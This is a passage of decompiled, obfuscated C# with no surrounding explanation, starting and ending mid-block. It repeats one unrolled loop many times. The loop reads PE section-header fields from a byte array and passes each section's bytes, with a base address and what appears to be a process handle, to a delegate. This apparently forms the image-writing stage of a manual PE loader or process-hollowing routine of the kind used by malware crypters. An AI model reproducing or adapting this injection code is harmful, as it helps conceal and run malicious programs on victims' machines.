					}
					((byte*)ptr)[4273] = ((*(int*)((byte*)ptr + 2704) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4273] != 0)
					{
						byte[] array224;
						checked
						{
							array224 = new byte[*unchecked((int*)((byte*)ptr + 2704)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 2708), array224, 0, array224.Length);
						((byte*)ptr)[4274] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 2700))), array224, array224.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4274] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4278] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4278] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 2712)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 2716)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 2720)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4276] = ((*(int*)((byte*)ptr + 2716) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4276] != 0)
					{
						byte[] array225;
						checked
						{
							array225 = new byte[*unchecked((int*)((byte*)ptr + 2716)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 2720), array225, 0, array225.Length);
						((byte*)ptr)[4277] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 2712))), array225, array225.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4277] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4281] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4281] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 2724)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 2728)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 2732)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4279] = ((*(int*)((byte*)ptr + 2728) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4279] != 0)
					{
						byte[] array226;
						checked
						{
							array226 = new byte[*unchecked((int*)((byte*)ptr + 2728)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 2732), array226, 0, array226.Length);
						((byte*)ptr)[4280] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 2724))), array226, array226.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4280] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4284] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4284] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 2736)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 2740)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 2744)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4282] = ((*(int*)((byte*)ptr + 2740) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4282] != 0)
					{
						byte[] array227;
						checked
						{
							array227 = new byte[*unchecked((int*)((byte*)ptr + 2740)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 2744), array227, 0, array227.Length);
						((byte*)ptr)[4283] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 2736))), array227, array227.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4283] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4287] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4287] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 2748)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 2752)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 2756)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4285] = ((*(int*)((byte*)ptr + 2752) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4285] != 0)
					{
						byte[] array228;
						checked
						{
							array228 = new byte[*unchecked((int*)((byte*)ptr + 2752)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 2756), array228, 0, array228.Length);
						((byte*)ptr)[4286] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 2748))), array228, array228.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4286] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4290] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4290] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 2760)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 2764)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 2768)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4288] = ((*(int*)((byte*)ptr + 2764) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4288] != 0)
					{
						byte[] array229;
						checked
						{
							array229 = new byte[*unchecked((int*)((byte*)ptr + 2764)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 2768), array229, 0, array229.Length);
						((byte*)ptr)[4289] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 2760))), array229, array229.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4289] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4293] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4293] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 2772)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 2776)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 2780)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4291] = ((*(int*)((byte*)ptr + 2776) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4291] != 0)
					{
						byte[] array230;
						checked
						{
							array230 = new byte[*unchecked((int*)((byte*)ptr + 2776)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 2780), array230, 0, array230.Length);
						((byte*)ptr)[4292] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 2772))), array230, array230.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4292] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4296] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4296] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 2784)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 2788)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 2792)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4294] = ((*(int*)((byte*)ptr + 2788) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4294] != 0)
					{
						byte[] array231;
						checked
						{
							array231 = new byte[*unchecked((int*)((byte*)ptr + 2788)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 2792), array231, 0, array231.Length);
						((byte*)ptr)[4295] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 2784))), array231, array231.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4295] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4299] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4299] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 2796)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 2800)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 2804)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4297] = ((*(int*)((byte*)ptr + 2800) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4297] != 0)
					{
						byte[] array232;
						checked
						{
							array232 = new byte[*unchecked((int*)((byte*)ptr + 2800)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 2804), array232, 0, array232.Length);
						((byte*)ptr)[4298] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 2796))), array232, array232.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4298] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4302] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4302] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 2808)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 2812)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 2816)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4300] = ((*(int*)((byte*)ptr + 2812) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4300] != 0)
					{
						byte[] array233;
						checked
						{
							array233 = new byte[*unchecked((int*)((byte*)ptr + 2812)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 2816), array233, 0, array233.Length);
						((byte*)ptr)[4301] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 2808))), array233, array233.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4301] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4305] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4305] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 2820)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 2824)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 2828)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4303] = ((*(int*)((byte*)ptr + 2824) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4303] != 0)
					{
						byte[] array234;
						checked
						{
							array234 = new byte[*unchecked((int*)((byte*)ptr + 2824)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 2828), array234, 0, array234.Length);
						((byte*)ptr)[4304] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 2820))), array234, array234.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4304] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4308] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4308] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 2832)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 2836)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 2840)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4306] = ((*(int*)((byte*)ptr + 2836) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4306] != 0)
					{
						byte[] array235;
						checked
						{
							array235 = new byte[*unchecked((int*)((byte*)ptr + 2836)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 2840), array235, 0, array235.Length);
						((byte*)ptr)[4307] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 2832))), array235, array235.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4307] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4311] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4311] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 2844)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 2848)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 2852)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4309] = ((*(int*)((byte*)ptr + 2848) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4309] != 0)
					{
						byte[] array236;
						checked
						{
							array236 = new byte[*unchecked((int*)((byte*)ptr + 2848)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 2852), array236, 0, array236.Length);
						((byte*)ptr)[4310] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 2844))), array236, array236.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4310] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4314] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4314] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 2856)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 2860)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 2864)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4312] = ((*(int*)((byte*)ptr + 2860) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4312] != 0)
					{
						byte[] array237;
						checked
						{
							array237 = new byte[*unchecked((int*)((byte*)ptr + 2860)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 2864), array237, 0, array237.Length);
						((byte*)ptr)[4313] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 2856))), array237, array237.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4313] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4317] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4317] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 2868)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 2872)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 2876)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4315] = ((*(int*)((byte*)ptr + 2872) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4315] != 0)
					{
						byte[] array238;
						checked
						{
							array238 = new byte[*unchecked((int*)((byte*)ptr + 2872)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 2876), array238, 0, array238.Length);
						((byte*)ptr)[4316] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 2868))), array238, array238.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4316] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4320] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4320] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 2880)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 2884)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 2888)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4318] = ((*(int*)((byte*)ptr + 2884) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4318] != 0)
					{
						byte[] array239;
						checked
						{
							array239 = new byte[*unchecked((int*)((byte*)ptr + 2884)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 2888), array239, 0, array239.Length);
						((byte*)ptr)[4319] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 2880))), array239, array239.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4319] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4323] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4323] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 2892)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 2896)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 2900)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4321] = ((*(int*)((byte*)ptr + 2896) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4321] != 0)
					{
						byte[] array240;
						checked
						{
							array240 = new byte[*unchecked((int*)((byte*)ptr + 2896)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 2900), array240, 0, array240.Length);
						((byte*)ptr)[4322] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 2892))), array240, array240.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4322] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4326] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4326] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 2904)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 2908)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 2912)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4324] = ((*(int*)((byte*)ptr + 2908) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4324] != 0)
					{
						byte[] array241;
						checked
						{
							array241 = new byte[*unchecked((int*)((byte*)ptr + 2908)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 2912), array241, 0, array241.Length);
						((byte*)ptr)[4325] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 2904))), array241, array241.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4325] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4329] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4329] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 2916)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 2920)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 2924)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4327] = ((*(int*)((byte*)ptr + 2920) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4327] != 0)
					{
						byte[] array242;
						checked
						{
							array242 = new byte[*unchecked((int*)((byte*)ptr + 2920)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 2924), array242, 0, array242.Length);
						((byte*)ptr)[4328] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 2916))), array242, array242.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4328] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4332] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4332] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 2928)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 2932)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 2936)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4330] = ((*(int*)((byte*)ptr + 2932) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4330] != 0)
					{
						byte[] array243;
						checked
						{
							array243 = new byte[*unchecked((int*)((byte*)ptr + 2932)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 2936), array243, 0, array243.Length);
